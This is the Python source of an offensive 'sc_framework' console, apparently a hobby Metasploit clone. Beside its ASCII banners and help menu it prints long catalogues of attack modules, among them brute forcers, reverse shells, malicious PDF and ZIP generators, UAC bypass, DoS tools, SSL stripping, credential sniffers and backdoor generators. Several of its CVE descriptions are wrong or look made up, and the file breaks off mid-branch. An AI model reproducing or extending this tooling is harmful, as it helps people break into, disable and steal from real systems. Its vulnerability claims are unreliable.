# This tool haves some tools in /sc_framework/tools/ .
# haves some exploit and wireless attack tools in /tools/ directory.
# DISCLAMER! : Every risk you done with this tool, is on your own sholder.
# imports

import os
import time
import random
import signal
import sys
import arrow
import psutil
from exploits import *
from payloads import *
from tools import *

#colors
class color:
    red = '\33[91m'
    blue = '\033[94m'
    white = '\033[0m'
    underline = '\033[4m'
    green = '\033[92m'
    warning = '\033[93m'

def signal_handler(sig, frame):

    print()
    print("\nCtrl+C pressed, exiting...")

    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

def start():
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting Sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sC console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc Console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc cOnsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc coNsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc conSole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consOle...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consoLe...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consolE...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')


def Menu():
    os.system('clear')
    list = [color.red + """
 ▄▀▀▀▀▄  ▄▀▄▄▄▄  
█ █   ▐ █ █    ▌ 
   ▀▄   ▐ █      
▀▄   █    █      
 █▀▀▀    ▄▀▄▄▄▄▀ 
 ▐      █     ▐  
        ▐        

 ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄    ▄▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █ 
█  ▄▀  ▀▄ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ █   █    ▐  █ █      █ █   █   █ █  █ ▄▀ 
▐ █▄▄▄▄   ▐  █▀▀█▀    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  ▐  █        █ █      █ ▐  █▀▀█▀  ▐  █▀▄  
 █    ▐    ▄▀    █   ▄▀   █   █    █    █    ▌    █   ▄    █  ▀▄    ▄▀  ▄▀    █    █   █ 
 █        █     █   █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄      ▀▄▀ ▀▄ ▄▀    ▀▀▀▀   █     █   ▄▀   █  
█         ▐     ▐   ▐   ▐   █    █     █    ▐            ▀             ▐     ▐   █    ▐  
▐                           ▐    ▐     ▐                                         ▐       
""",
color.green + """
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
              ┬              ┌─┐┌─┐                ┬
              │              └─┐│                  │
              o              └─┘└─┘                o
              ┬    ┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─     ┬ 
              │    ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐     │ 
              o    └  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴     o 
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
""",
color.warning + """
                    .▄▄ ·  ▄▄·                                 
                    ▐█ ▀. ▐█ ▌▪                                
                    ▄▀▀▀█▄██ ▄▄                                
                    ▐█▄▪▐█▐███▌                                
                     ▀▀▀▀ ·▀▀▀                                 
    ·▄▄▄▄▄▄   ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▄  ▄ •▄       
    ▐▄▄·▀▄ █·▐█ ▀█ ·██ ▐███▪▀▄.▀·██· █▌▐█▪     ▀▄ █·█▌▄▌▪      
    ██▪ ▐▀▀▄ ▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐▀▀▄·      
    ██▌.▐█•█▌▐█ ▪▐▌██ ██▌▐█▌▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█.█▌      
    ▀▀▀ .▀  ▀ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀·▀  ▀      
""",
color.blue + """
                     ______
             \    .-        -. 
     __<@\_______/            \__________________________________
  (I)___|________}  .-.  .-.  ,{____framework___________________/
       <@/      | )(_S/  \C_)( |  
                |/     /\     \|     / 
                <__    ^^    __>
                 \__|IIIIII|__/
                  \ \      / / 
                   \ IIIIII /
                    -------- 
""",
color.red + """
                                              .------..------.          
 .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  |S.--. ||C.--. |          
((5))((5))((5))((5))((5))((5))((5))((5))((5)) | :/\: || :/\: |          
 '-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.| :\/: || :\/: |          
  ((1))((1))((1))((1))((1))((1))((1))((1))((1)) '--'S|| '--'C|          
   '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'`------'`------'          
.------..------..------..------..------..------..------..------..------.
|F.--. ||R.--. ||A.--. ||M.--. ||E.--. ||W.--. ||O.--. ||R.--. ||K.--. |
| :(): || :(): || (\/) || (\/) || (\/) || :/\: || :/\: || :(): || :/\: |
| ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() || :\/: |
| '--'F|| '--'R|| '--'A|| '--'M|| '--'E|| '--'W|| '--'O|| '--'R|| '--'K|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
""",
"""
000000000000""" + color.warning + """1      1""" + color.white + """0000000000000000000000000000
       000000""" + color.warning + """1""" + color.white + """0000""" + color.warning + """1""" + color.white + """0000000000000000
  000""" + color.warning + """1""" + color.white + """0000000""" + color.warning + """111111""" + color.white + """00000000""" + color.warning + """1""" + color.white + """
     """ + color.warning + """11""" + color.white + """0000""" + color.warning + """1111111111""" + color.white + """00000""" + color.warning + """11""" + color.white + """
    00""" + color.warning + """11""" + color.white + """00""" + color.warning + """111111111111""" + color.white + """000""" + color.warning + """11""" + color.white + """000
    000""" + color.warning + """1111111111111111111""" + color.white + """000000000000
0000000  """ + color.red + """CVE-2022-24521""" + color.white + """  000000000000000000000000000000000000000
   00000""" + color.warning + """11111111111111111""" + color.white + """000
00000000""" + color.warning + """11111111111111111""" + color.white + """000000000
   0000""" + color.warning + """1111111111111111111""" + color.white + """000000
  0000""" + color.warning + """11""" + color.white + """00""" + color.warning + """1111111111111""" + color.white + """00""" + color.warning + """11""" + color.white + """000000000000
00000""" + color.warning + """11""" + color.white + """000000""" + color.warning + """1111111""" + color.white + """000000""" + color.warning + """11""" + color.white + """000000
   00""" + color.warning + """1""" + color.white + """000000000000000000000""" + color.warning + """1""" + color.white + """000000000000000000
""",
color.warning + color.red + color.green + """
                          (                                     
                          )\ )   (                              
                         (()/(   )\                             
                          /(_))(((_)                            
                         (_))  )\___                            
                         / __|((/ __|                           
                         \__ \ | (__                            
 (     (                *|___/  \___|          )   (         )  
 )\ )  )\ )    (      (  `         (  (     ( /(   )\ )   ( /(  
(()/( (()/(    )\     )\))(   (    )\))(   ')\()) (()/(   )\()) 
 /(_)) /(_))((((_)(  ((_)()\  )\  ((_)()\ )((_)\   /(_))|((_)\  
(_))_|(_))   )\ _ )\ (_()((_)((_) _(())\_)() ((_) (_))  |_ ((_) 
| |_  | _ \  (_)_\(_)|  \/  || __|\ \((_)/ // _ \ | _ \ | |/ /  
| __| |   /   / _ \  | |\/| || _|  \ \/\/ /| (_) ||   /   ' <   
|_|   |_|_\  /_/ \_\ |_|  |_||___|  \_/\_/  \___/ |_|_\  _|\_\                                                               
"""]
    random_banner = random.choice(list)
    print(random_banner)
    print()
    print()
    print()
    print(color.white + "        +[ " + color.red + "sc_framework v1.9" + color.white + "                           ]+")
    print("        -* 81 exploits - 31 auxiliary - 24 cve exploits *-")
    print("        -* 19 payloads *-")
    print()
    print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
    print()
    Console()


def Console():
    scconsole = input("sc~>")
    if scconsole == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
use <exploit> ---> to use the exploit.
search ---> to see the search options.
exit ---> to exit from sc-console.
show payloads ---> to see avalable payloads in sc-framework.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
db_scscanner ---> normal scanner of scconsole, type 'db_scscanner -h' to see help menu of db_scscanner.
""")
    elif scconsole == "h":
        print("""
help ---> to see the full help menu.

clear ---> to clear the screen.
search ---> to see the search options.
exit ---> to exit from sc-console.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
""")
    elif scconsole == "show options":
        print("""
PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
""")
    elif scconsole == "clear":
        os.system('clear')
    elif scconsole == "search":
        print("""
search [ exploits | exploit | windows | site | cve-exploits ]
       [ osx | linux | multi | server | dos | php           ]
       [ auxiliary | sniffer | scanner                      ]
""")
    elif scconsole == "search exploits":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """windows/java-rhino""" + color.white + """                                  24/01/12 02:45       for excuteshellcommand http port.
""" + color.red + """site/tomcat-mgr-login""" + color.white + """                               24/01/12 04:23       for brute force login pages.
""" + color.red + """windows/ms17_010""" + color.white + """                                    24/01/13 08:20       for brute force windows smb port.
""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                          24/01/13 10:39       for execute the command with elevated privileges on the target.
""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                    24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
""" + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """                              24/01/14 09:35       to try passwords, sql injection, xss, php on the taregt login-page.
""" + color.red + """site/vuln-curl-website""" + color.white + """                              24/01/14 11:40       for finding vulnerabilite in the target website.
""" + color.red + """site/find-vulnerabilites-website2""" + color.white + """                   24/01/14 12:31       for finding vulnerabilite with payload you specified.
""" + color.red + """site/ZIP-exploit""" + color.white + """                                    24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
""" + color.red + """windows/PDF-exploit""" + color.white + """                                 24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
""" + color.red + """exploit/ssh-version""" + color.white + """                                 24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
""" + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """site/http-login-test""" + color.white + """                                24/01/19 12:01       for login on port 80 http port.
""" + color.red + """exploit/reverse-shell""" + color.white + """                               24/01/20 01:12       for get a reverse shell by sending a link.
""" + color.red + """exploit/handler/handler""" + color.white + """                             24/01/22 02:34       for listen on the target to open the exploit2.php.
""" + color.red + """exploit/handler/listining""" + color.white + """                           24/01/22 04:12       for listen on the target to open the exploit.php.
""" + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """               23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
""" + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """ 23/09/29 02:19       allow to test the target to find cve-2023-22518 vulnerabilitie.
""" + color.red + """dos/DD_D_Attack""" + color.white + """                                     25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """                         25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
""" + color.red + """site/Directory-finder""" + color.white + """                               25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys.
""" + color.red + """site/struts2_namespace_ognl""" + color.white + """                         25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
""" + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06 02:03       provides a reverse shell payload that can be used to establish a reverse shell connection.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10       This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30       extract sensitive information with the payloads have, extract informations like tables, columns, databases.
""" + color.red + """site/cve-2022-24521""" + color.white + """                                 22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
""" + color.red + """site/information-gather""" + color.white + """                             25/02/17 12:40       gets the information from the website like some links, some images, some more information.
""" + color.red + """site/port-scan"""  + color.white + """                                      25/02/17 01:15       Scans for open ports (work normaly!).
""" + color.red + """dos/ciscodos""" + color.white + """                                        03/07/22 10:07       Remote DoS against the recent Cisco IOS vuln.
""" + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """           04/02/14 04/37       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
""" + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05 12:17       tcpdump - ISAKMP Identification Payload Integer Overflow.
""" + color.red + """php/RCE_via_PHP""" + color.white + """                                     25/02/18 12:53       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
""" + color.red + """php/SOPlanning_1-52-01_RCE""" + color.white + """                          24/11/15 08:29       SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE)(Authenticated).
""" + color.red + """multi/Typora_v1-7-4""" + color.white + """                                 24/01/29 08:48       Typora v1.7.4 - OS Command Injection.
""" + color.red + """php/Wp2Fac""" + color.white + """                                          23/09/08 09:24       Wp2Fac - OS Command Injection.
""" + color.red + """multi/os_detector""" + color.white + """                                   25/02/19 12:43       try to detect the target OS with the port you typed.
""" + color.red + """multi/pop3-pass""" + color.white + """                                     25/02/20 11:57       exploits a buffer overflow vulnerability in a POP3 server.
""" + color.red + """multi/pop3-brute-force""" + color.white + """                              25/02/21 01:44       brute-forcing the pop3 port.
""" + color.red + """windows/shell-storm""" + color.white + """                                 25/02/23 08:00       trys to send buffer overflow and take a shellcode.
""" + color.red + """site/Aurba-501""" + color.white + """                                      24/08/24 05:14       Remote Command Execution | Aurba 501.
""" + color.red + """site/HughesNet-HT2000W-Satellite-Modem""" + color.white + """              24/08/24 09:58       HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset.
""" + color.red + """server/cve-2025-0001""" + color.white + """                                25/01/01 04:07       Remote Code Execution in Apache HTTP Server 2.4.54.
""" + color.red + """server/cve-2025-0006""" + color.white + """                                25/01/01 04:27       SQL Injection in MySQL 8.0.28.
""" + color.red + """windows/reverse_tcp""" + color.white + """                                 25/02/28 04:49       send a payload to the target machine, if success, connect back to attacker machine.
""" + color.red + """exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti""" + color.white + """ 25/01/02 05:25 This vulnerability enables attackers to upload malicious files (e.g., web shells) and execute commands on the target system with elevated privileges.
""" + color.red + """site/Devika-v1-Path-Traversal""" + color.white + """                       24/08/04 12:08       Devika v1 - Path Traversal via 'snapshot_path' Parameter.
""" + color.red + """sniffer/sniffer""" + color.white + """                                     25/03/13 12:33       This module captures network traffic and logs it to a file.
""" + color.red + """php/POST-request""" + color.white + """                                    25/03/14 12:53       aims to upload a PHP file with a command execution payload to a vulnerable upload URL.
""" + color.red + """sniffer/credential-collector""" + color.white + """                        25/03/14 01:23       This module collects cleartext credentials, such as passwords, from network traffic.
""" + color.red + """sniffer/inspect_traffic""" + color.white + """                             25/03/16 11:10       This module analyzes network traffic and identifies potential vulnerabilities.
""" + color.red + """sniffer/SSLstrip""" + color.white + """                                    25/03/17 08:54       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
""" + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                             25/03/18 11:34       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
""" + color.red + """sniffer/ettercap-sniffer""" + color.white + """                            25/03/18 11:43       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
""" + color.red + """multi/nmap-version-detection""" + color.white + """                        25/04/04 10:35       uses nmap to detect version.
""" + color.red + """sniffer/ble-scanner""" + color.white + """                                 25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
""" + color.red + """multi/ble-bypass""" + color.white + """                                    25/04/05 04:14       This is a vulnerability in the BLE protocol that allows attackers to bypass security measures and gain unauthorized access to a target system. The exploit involves exploiting a flaw in the encryption used in BLE connections.
""" + color.red + """multi/ble-scanner""" + color.white + """                                   25/04/04 11:01       scans bluetooths around you (sudo permission needed!).
""" + color.red + """dos/ble-dos""" + color.white + """                                         25/04/05 16:35       scans the bluetooths around you and then let you to choose target, trys to connect, then starts the attack.
""" + color.red + """scanner/portscan-tcp""" + color.white + """                                25/04/08 09:28       scans for open ports.
""" + color.red + """scanner/vnc-none-auth""" + color.white + """                               25/04/08 09:46       scans the VNC port to see if it is open or closed.
""" + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08 09:54       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
""" + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08 10:01       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
""" + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10 08:05       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
""" + color.red + """scanner/portscan""" + color.white + """                                    25/04/10 08:13       scans the port you specified to see they are open or closed.
""" + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15 09:49       uses ping tool to make sure target or website is reachable.
""" + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16 06:02        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
""" + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
""" + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24 12:38       This exploit uses scpgenerator to generate a backdoor for you.
""" + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25 04:24       starts a listener with netcat (netcat reqires!).
""" + color.red + """windows/ms08_067_netapi""" + color.white + """                             25/02/26 04:12       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
""" + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """          25/04/27 12:34       WordPress Core 6.2 - Directory Traversal.
""" + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """ 25/04/27 12:55       Apache Commons FileUpload and Apache Tomcat DoS.
""" + color.red + """site/Apache_commons_text_RCE""" + color.white + """                        25/04/28 10:17       This exploit demonstrates an RCE vector via POST data, differing.
""" + color.red + """scanner/http-options""" + color.white + """                                25/05/01 03:41       scan the specified host for the available HTTP methods and print the results.
""" + color.red + """scanner/https-options""" + color.white + """                               25/05/01 03:43       scan the specified host for the available HTTP methods and print the results.
""" + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01 04:06       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
""")
    elif scconsole == "search exploit":
        print("""
    Exploits                                                 When created?        Discrepstion 
""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                                   24/01/13 10:39       for execute the command with elevated privileges on the target.
""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                             24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
""" + color.red + """exploit/ssh-version""" + color.white + """                                          24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
""" + color.red + """exploit/reverse-shell""" + color.white + """                                        24/01/20 01:12       for get a reverse shell by sending a link.
""" + color.red + """exploit/handler/handler""" + color.white + """                                      24/01/22 02:34       for listen on the target to open the exploit2.php.
""" + color.red + """exploit/handler/listining""" + color.white + """                                    24/01/22 04:12       for listen on the target to open the exploit.php.
""" + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """                        23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
""" + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """          23/09/29 02:19       allow to test the target to find cve-2023-22518 vulnerabilitie.
""" + color.red + """exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti""" + color.white + """    25/01/02 05:25       This vulnerability enables attackers to upload malicious files (e.g., web shells) and execute commands on the target system with elevated privileges.
""")
    elif scconsole == "search windows":
        print("""
    Exploits                              When created?        Discrepstion 
""" + color.red + """windows/PDF-exploit""" + color.white + """                       24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
""" + color.red + """windows/ftp-login-test""" + color.white + """                    24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """windows/java-rhino""" + color.white + """                        24/01/12 02:45       for excuteshellcommand http port.
""" + color.red + """windows/ms17_010""" + color.white + """                          24/01/13 08:20       for brute force windows smb port.
""" + color.red + """windows/ssh-login-test""" + color.white + """                    24/01/11 05:54       for brute forcing ssh port.
""" + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """               25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
""" + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """ 04/02/14 04/37       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
""" + color.red + """windows/shell-storm""" + color.white + """                       25/02/23 08:00       trys to send buffer overflow and take a shellcode.
""" + color.red + """windows/reverse_tcp""" + color.white + """                       25/02/28 04:49       send a payload to the target machine, if success, connect back to attacker machine.
""" + color.red + """windows/ms08_067_netapi""" + color.white + """                   25/02/26 04:12       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
""")
    elif scconsole == "search site":
        print("""
    Exploits                          When created?        Discrepstion 
""" + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """                 24/01/14 09:35       for alert the XSS attack in html file.
""" + color.red + """site/vuln-curl-website""" + color.white + """                 24/01/14 11:40       for finding vulnerabilite in the target website.
""" + color.red + """site/find-vulnerabilites-website2""" + color.white + """      24/01/14 12:31       for finding vulnerabilite with payload you specified.
""" + color.red + """site/http-login-test""" + color.white + """                   24/01/19 12:01       for login on port 80 http port.
""" + color.red + """site/ZIP-exploit""" + color.white + """                       24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
""" + color.red + """site/tomcat-mgr-login""" + color.white + """                  24/01/12 04:23       for brute force login pages.
""" + color.red + """site/Directory-finder""" + color.white + """                  25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys (works slow).
""" + color.red + """site/struts2_namespace_ognl""" + color.white + """            25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
""" + color.red + """site/reverse_http""" + color.white + """                      25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
""" + color.red + """site/cve-2022-24521""" + color.white + """                    22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
""" + color.red + """site/information-gather""" + color.white + """                25/02/17 12:40       gets the information from the website like some links, some images, some more information.
""" + color.red + """site/port-scan"""  + color.white + """                         25/02/17 01:15       Scans for open ports (work normaly!).
""" + color.red + """site/Aurba-501""" + color.white + """                         24/08/24 05:14       Remote Command Execution | Aurba 501.
""" + color.red + """site/HughesNet-HT2000W-Satellite-Modem""" + color.white + """ 24/08/24 09:58       HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset.
""" + color.red + """site/Devika-v1-Path-Traversal""" + color.white + """          24/08/04 12:08       Devika v1 - Path Traversal via 'snapshot_path' Parameter.
""" + color.red + """site/Apache_commons_text_RCE""" + color.white + """           25/04/28 10:17       This exploit demonstrates an RCE vector via POST data, differing.
""")
    elif scconsole == "search cve-exploits":
        print()
        print("    Exploits                                           When created?        Discrepstion")
        print(color.red + "tools/cve-exploits/SOPlanning-1_52_01-52082" + color.white + "            25/01/12 08:14       Simple Online Planning Tool - Remote Code Execution (RCE) (Authenticated).")
        print(color.red + "tools/cve-exploits/TCP-IP-DoS-52075" + color.white + "                    25/01/11 01:34       Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service.")
        print(color.red + "tools/cve-exploits/http-post-request_cve-2024-48871" + color.white + "    24/04/18 03:40       uses the Flask framework to create a web server with an endpoint that executes arbitrary commands received from the client.")
        print(color.red + "tools/cve-exploits/http-request_cve-2024-52320" + color.white + "         24/04/16 05:45       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.")
        print(color.red + "tools/cve-exploits/http-request_cve-2024-52558" + color.white + "         24/04/15 04:53       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.")
        print(color.red + "tools/cve-exploits/ipv6_cve-2024-38106" + color.white + "                 24/04/12 01:12       Windows IPv6 exploit.")
        print(color.red + "tools/cve-exploits/wordfence_cve-2024-8543" + color.white + "             25/01/09 12:39       This is an exploit for a Cross-Site Scripting (XSS) vulnerability in the Slider Comparison Image plugin for WordPress.")
        print(color.red + "tools/cve-exploits/OpenSSH_5-3_32bit_86x_0day" + color.white + "          19/02/01 10:50       OpenSSH 5.3 32-bit x86 remote root 0day exploit.")
        print(color.red + "tools/cve-exploits/OpenSSH_5-3p1_cve-2022-28123" + color.white + "        22/04/08 11:21       OpenSSH 5.3p1 cve-2022-28123 exploit.")
        print(color.red + "tools/cve-exploits/cve-2023-22518" + color.white + "                      23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.")
        print(color.red + "tools/cve-exploits/7-zip_cve-2025-0411" + color.white + "                 25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.")
        print(color.red + "tools/cve-exploits/PCMan_FTP_Server-2_0-pwd_Remote_Buffer_Overflow" + color.white + "23/09/25 07:11       PCMan FTP Server 2.0 pwd Remote Buffer Overflow.")
        print(color.red + "tools/cve-exploits/Heartbleed_cve-2014-0160" + color.white + "            14/04/12 12:03       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.")
        print(color.red + "tools/cve-exploits/POODLE_cve-2014-3566" + color.white + "                14/02/06 05:07       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.")
        print(color.red + "tools/cve-exploits/Slammer_cve-2007-5391" + color.white + "               07/05/23 01:12       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.")
        print(color.red + "tools/cve-exploits/cve-2022-24521" + color.white + "                      22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.")
        print(color.red + "tools/cve-exploits/cve-2010-2730" + color.white + "                       10/06/12 07:11       Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request.")
        print(color.red + "tools/cve-exploits/cve-2025-0001" + color.white + "                       25/01/01 04:07       Remote Code Execution in Apache HTTP Server 2.4.54.")
        print(color.red + "tools/cve-exploits/cve-2025-0006" + color.white + "                       25/01/01 04:27       SQL Injection in MySQL 8.0.28.")
        print(color.red + "tools/cve-exploits/DocsGPT_0-12-0_RCE" + color.white + "                  25/04/09 11:34       DocsGPT 0.12.0 - Remote Code Execution")
        print(color.red + "tools/cve-exploits/cve-2025-0282" + color.white + "                       25/04/18 07:25       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).")
        print()
        print("You can't run these exploits from here, you need to run them from ",os.getcwd(),"/tools/cve-exploits/")
        print()
        print("Before running them, see the code, besauce the exploits haves some variables needs t oassigns it!")
        print()
    elif scconsole == "search multi":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
